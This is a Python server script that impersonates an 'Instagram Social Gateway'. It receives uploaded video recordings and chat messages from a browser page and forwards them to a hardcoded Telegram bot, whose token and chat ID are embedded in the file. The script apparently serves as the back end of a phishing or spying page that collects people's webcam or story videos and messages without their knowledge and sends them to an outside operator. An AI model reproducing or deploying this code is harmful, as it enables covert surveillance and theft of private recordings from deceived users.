import http.server
import json
import os
import urllib.request
import time

# PASTE YOUR SYSTEM CREDENTIALS HERE
TELEGRAM_BOT_TOKEN = "8837215809:AAEJJ05BIjul96LJtHP_ZiKz_lnyk5a8esA"
TELEGRAM_CHAT_ID = "7787904819"

class InstagramSocialGateway(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/upload-video':
            content_length = int(self.headers['Content-Length'])
            raw_data = self.rfile.read(content_length)
            
            try:
                boundary = self.headers['Content-Type'].split("=")[1].encode()
                parts = raw_data.split(boundary)
                
                video_bytes = b""
                chat_msg_content = ""
                
                # Sort through stream blocks to see if it is text or a video file
                for part in parts:
                    if b'name="video_file"' in part:
                        header_end = part.find(b'\r\n\r\n') + 4
                        video_bytes = part[header_end:-4]
                    elif b'name="chat_msg"' in part:
                        header_end = part.find(b'\r\n\r\n') + 4
                        chat_msg_content = part[header_end:-4].decode('utf-8').strip()

                # FLOW A: If a user typed a live chat message or clicked "Call"
                if chat_msg_content:
                    print(f"[*] Direct Text Route hit: {chat_msg_content}")
                    encoded_text = urllib.parse.quote(f"💬 Live Studio Interaction:\n\n{chat_msg_content}")
                    telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage?chat_id={TELEGRAM_CHAT_ID}&text={encoded_text}"
                    
                    req = urllib.request.Request(telegram_url)
                    with urllib.request.urlopen(req) as response:
                        response.read()

                # FLOW B: If a user stopped a video story recording
                elif video_bytes:
                    print("[*] Processing story file chunks for forwarding...")
                    unique_filename = f"reel_{int(time.time())}.webm"
                    boundary_str = "----WebKitFormBoundaryTelegramTransmission"
                    body = []
                    
                    body.append(f'--{boundary_str}'.encode())
                    body.append(f'Content-Disposition: form-data; name="chat_id"'.encode())
                    body.append(b'')
                    body.append(TELEGRAM_CHAT_ID.encode())
                    
                    body.append(f'--{boundary_str}'.encode())
                    body.append(f'Content-Disposition: form-data; name="caption"'.encode())
                    body.append(b'')
                    body.append(b"📹 New Fullscreen Video Clip Received!")
                    
                    body.append(f'--{boundary_str}'.encode())
                    body.append(f'Content-Disposition: form-data; name="video"; filename="{unique_filename}"'.encode())
                    body.append(b'Content-Type: video/webm')
                    body.append(b'')
                    body.append(video_bytes)
                    body.append(f'--{boundary_str}--'.encode())
                    
                    payload = b'\r\n'.join(body)
                    telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendVideo"
                    
                    req = urllib.request.Request(telegram_url, data=payload)
                    req.add_header('Content-Type', f'multipart/form-data; boundary={boundary_str}')
                    with urllib.request.urlopen(req) as response:
                        response.read()

                # Send response confirmation back to browser engine
                self.send_response(200)
                self.send_header('Content-Type', 'text/plain')
                self.end_headers()
                self.wfile.write(b"Data element synchronized successfully.")
                
            except Exception as e:
                print(f"[-] Data transaction error: {e}")
                self.send_error(500, "Internal Server Error")
        else:
            self.send_error(404, "Not Found")

port = int(os.environ.get("PORT", 8443))
server_address = ('0.0.0.0', port)
httpd = http.server.HTTPServer(server_address, InstagramSocialGateway)

print(f"[*] Live Instagram Gateway running online on port {port}")
httpd.serve_forever()
